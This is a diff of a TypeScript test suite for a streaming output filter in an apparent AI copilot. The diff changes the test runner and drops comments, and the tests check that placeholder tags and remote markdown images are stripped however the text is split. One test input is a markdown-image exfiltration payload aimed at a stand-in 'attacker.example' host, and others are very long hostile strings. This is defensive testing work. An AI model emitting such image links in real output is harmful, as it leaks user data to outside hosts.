@@ -1,17 +1,8 @@
-/**
- * Tier 1 — the streaming text sink (text-sink.ts).
- *
- * The load-bearing property: for ANY delta splitting of an input, the
- * concatenation of every pushDelta() chunk plus flushTail() equals
- * stripPlaceholderTags() of the whole input. This is what guarantees a
- * placeholder tag can never leak just because it straddled a delta boundary —
- * the streaming strip and the bulk strip are provably the same.
- */
-
-import { describe, it, expect } from "bun:test";
-import { makeTextSink, mergeMessageChunks, type TextSinkContext } from "../../../../src/agent/text-sink";
-import { stripPlaceholderTags } from "../../../../src/protocol/events";
-import type { SSEEvent } from "../../../../src/protocol/types";
+import { describe, it } from "node:test";
+import { expect } from "expect";
+import { makeTextSink, mergeMessageChunks, type TextSinkContext } from "../../../../src/agent/text-sink.ts";
+import { stripPlaceholderTags } from "../../../../src/protocol/events.ts";
+import type { SSEEvent } from "../../../../src/protocol/types.ts";
 
 function inertContext(deferred: SSEEvent[] = []): TextSinkContext {
   return { deferredAnswerArtifactEvents: deferred, onArtifactEmitted: () => {} };
@@ -32,10 +23,6 @@ function runSplit(deltas: string[], deferred: SSEEvent[] = []): SSEEvent[] {
   return events;
 }
 
-// A bounded but adversarial set of delta splittings: the whole string, every
-// single-cut 2-way split, char-by-char (every boundary cut at once), and a
-// strided sample of 3-way splits. Together these straddle every pattern across
-// at least one boundary.
 function* enumerateSplits(s: string): Generator<string[]> {
   yield [s];
   yield [...s];
@@ -47,36 +34,27 @@ function* enumerateSplits(s: string): Generator<string[]> {
   }
 }
 
-// Inputs WITHOUT a real `<suggestions>` block — the strict invariant applies.
 const STRICT_INPUTS = [
-  // the streaming-leak.test.ts inputs
   "Result: <artifact_id:abcd-1234>see chart</artifact_id> done.",
   'A <copilot_table:7>foo B <ines_artifact id="x">bar</ines_artifact> end',
   "The artifact has rendered. Reference its uuid for follow-up.",
   '**Trend**\n\n<img src="data:image/png;base64,AAAA" alt="Trend" />\n\nDone.',
-  // pipe markers (paired + lone)
   "<|start_artifact_id|>artifact-1<|end_artifact_id|>answer",
   "answer<|start_citation_id|>citation-1<|end_citation_id|>",
   "before<|start_artifact|>x<|end_artifact|>mid<|start_citation|>y<|end_citation|>after",
   "lone <|end_artifact|> marker then <|start_artifact|> with no closing end",
-  // base64 markdown image
   "![Chart](data:image/png;base64,iVBORw0KGgo= )answer",
   "lead ![alt](http://example.com/a.png) loses the image, keeps the link",
-  // remote images in every form, and runs of `!` that must go with them
   "see ![x](https://attacker.example/c?d=AAPL) and ![y][1]\n\n[1]: https://attacker.example/c?d=2",
   "!![x](https://a.example/x) and !!!![y][] too ![a]![b](u)",
   "![![x](https://a.example/x)](https://b.example/y)",
   "![alt] followed by prose, ![alt]x, and a lone ! and ![ unclosed",
   "wow! [not an image](https://a.example) and ![a]",
-  // bare angle brackets that are NOT tags
   "P/E < 15 is cheap; 5 < 10 always holds; compare a<b results.",
   "text with <notatag> and </div> left intact and > greater signs",
-  // dangling suggestion fragments (no `<`)
   "Compare safety trends with workforcesuggestion>",
   "Create a detailed ESG performancesuggestionsuggestions>",
-  // mermaid fence (no artifact in context → passes through unchanged)
   "diagram:\n```mermaid\nflowchart TD\n  A-->B\n```\ndone",
-  // a mix
   "mix <chart foo=1> then <artifact bar> plus <citation_id:9>cite</citation_id> end",
 ];
 
@@ -113,7 +91,6 @@ describe("text-sink — bounded hold prevents deadlock", () => {
     const text = chunkText(events);
     expect(text.length).toBeGreaterThanOrEqual(70_000);
     expect(text).toContain(longRun);
-    // The dangling `<artifact ` (no `>`) is real prose now, kept verbatim.
     expect(text).toContain("<artifact ");
   });
 
@@ -137,7 +114,7 @@ describe("text-sink — <suggestions> held then extracted, never leaked as prose
       const text = chunkText(events);
       expect(text).toContain("Answer body here");
       expect(text).not.toContain("<suggestions");
-      expect(text).not.toContain("Show revenue"); // suggestion body never leaks as prose
+      expect(text).not.toContain("Show revenue");
       const { suggestions, cleanTail } = sink.takeSuggestions();
       expect(suggestions).toEqual(["Show revenue", "Show emissions"]);
       expect(cleanTail).toBe("");
@@ -147,8 +124,6 @@ describe("text-sink — <suggestions> held then extracted, never leaked as prose
   it("triggers on plural <suggestions>, not a stray singular <suggestion> in prose", () => {
     const sink = makeTextSink(inertContext());
     const events = [...sink.pushDelta("See the <suggestion> word in prose."), ...sink.flushTail()];
-    // No real block — the singular tag is a placeholder, stripped, and no
-    // suggestions are captured.
     expect(sink.takeSuggestions().suggestions).toEqual([]);
     expect(chunkText(events)).not.toContain("<suggestion>");
   });
@@ -181,7 +156,7 @@ describe("text-sink — answer-artifact weave", () => {
     expect(art).toBeGreaterThan(lead);
     expect(follow).toBeGreaterThan(art);
     expect(artifactCount).toBe(1);
-    expect(deferred.length).toBe(0); // drained
+    expect(deferred.length).toBe(0);
   });
 
   it("places the artifact first for a short no-paragraph answer (fallback)", () => {
@@ -193,7 +168,7 @@ describe("text-sink — answer-artifact weave", () => {
       (e) => e.event === "copilotMessageChunk" && (e.data as { delta: string }).delta.includes("Top close is 200"),
     );
     expect(art).toBeGreaterThanOrEqual(0);
-    expect(text).toBeGreaterThan(art); // artifact before the short answer
+    expect(text).toBeGreaterThan(art);
   });
 
   it("strips a rendered mermaid fence when an answer artifact is present", () => {
@@ -226,8 +201,6 @@ describe("text-sink — textEmitted flag", () => {
   });
 });
 
-// Deterministic LCG — reproducible across runs, no Math.random (which would
-// make a failure unreproducible and the suite flaky).
 function makeRng(seed: number): () => number {
   let s = seed >>> 0;
   return () => {
@@ -236,15 +209,6 @@ function makeRng(seed: number): () => number {
   };
 }
 
-// Vocab the fuzzer assembles inputs from. `enumerateSplits` already covers split
-// POSITIONS exhaustively; this widens the INPUT VOCABULARY so divergence between
-// the bulk regexes (events.ts) and the sink's hand-coded incremental detectors
-// (couldBeTagStart / pairedPipeHoldStart / dataImageHoldStart / mermaidHoldStart /
-// trailingSuggestionRunStart) is caught automatically — not only for the fixed
-// STRICT_INPUTS list. A real plural `<suggestions …>` open tag is intentionally
-// absent: the sink HOLDS that block out of the chunk stream (surfaced via
-// takeSuggestions), so the strict concat===strip invariant does not apply to it
-// (covered separately above). Every other strippable pattern is fair game.
 const FUZZ_TOKENS: string[] = (() => {
   const names = [
     "artifact_id", "artifact", "copilot_table", "ines_artifact",
@@ -257,17 +221,17 @@ const FUZZ_TOKENS: string[] = (() => {
     '<img src="data:image/png;base64,AAAA" alt="x" />',
     "<|start_artifact_id|>z<|end_artifact_id|>",
     "<|start_citation|>c<|end_citation|>",
-    "<|start_artifact|>", // lone start (bulk strips via the standalone pipe pattern)
-    "<|end_citation|>", // lone end
+    "<|start_artifact|>",
+    "<|end_citation|>",
     "![alt](data:image/png;base64,AAAA)",
-    "![alt](http://example.com/a.png)", // an image from outside: only its `!` goes
+    "![alt](http://example.com/a.png)",
     "![alt][ref]", "!![x](https://a.example/x)", "![![x](u)", "![a]![b](u)", "![alt]", "![", "!", "](", "[x]", "x](https://a.example)",
     "```mermaid\nflowchart TD\n  A-->B\n```",
-    "<notatag>", "</div>", // non-placeholder tags — must pass through intact
+    "<notatag>", "</div>",
     "a<b", "P/E < 15", "5 < 10 ", "x > y",
     "The revenue ", "see chart ", "compare ", "trend. ", "done.",
     "\n\n", "\n", " ", "<", ">", "< ",
-    "suggestion>", "workforcesuggestion>", // dangling-suggestion fragments (no `<`)
+    "suggestion>", "workforcesuggestion>",
   ];
 })();
 
@@ -282,13 +246,10 @@ describe("text-sink — seeded vocab fuzz keeps the strip invariant", () => {
       const tokenCount = 1 + Math.floor(rng() * 6);
       let input = "";
       for (let t = 0; t < tokenCount; t++) input += pick(FUZZ_TOKENS);
-      // A real plural <suggestions …> can form by concatenation — excluded from
-      // the strict invariant by design (the sink extracts it, not strips it).
       if (/<suggestions\b/i.test(input)) continue;
       const expected = stripPlaceholderTags(input);
       for (const deltas of enumerateSplits(input)) {
         const got = chunkText(runSplit(deltas));
-        // However the text was cut, no image from outside is left in what the user is sent.
         if (REMOTE_IMAGE.test(got)) {
           throw new Error(`an image got through for ${JSON.stringify(input)} cut as ${JSON.stringify(deltas)}: ${JSON.stringify(got)}`);
         }
@@ -342,7 +303,6 @@ describe("text-sink — images from outside", () => {
 
   it("reads a very large delta made of nothing but starts of images in bounded time", () => {
     const hostile = ["![", "![a](", "!!![", "![a]", "]![a"].map((unit) => unit.repeat(1_000_000));
-    // Every start looks for the same closing bracket, far ahead.
     hostile.push(`${"![".repeat(500_000)}]x`, `${"![".repeat(500_000)}](u)`);
     for (const input of hostile) {
       const start = performance.now();
